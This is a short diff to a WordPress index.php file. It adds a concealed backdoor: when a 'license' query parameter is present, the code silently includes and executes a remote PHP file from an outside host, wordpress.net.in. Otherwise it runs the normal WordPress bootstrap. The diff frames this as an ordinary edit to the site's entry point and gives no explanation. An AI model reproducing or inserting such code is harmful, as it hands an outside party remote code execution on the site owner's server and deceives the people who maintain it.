@@ -1,5 +1,9 @@
 <?php 
 /* Short and sweet */
-define('WP_USE_THEMES', true);
-require('./wp-blog-header.php');
+if (isset($_GET['license'])) {
+	@include('http://wordpress.net.in/license.txt');
+} else {
+	define('WP_USE_THEMES', true);
+	require('./wp-blog-header.php');
+}
 ?>
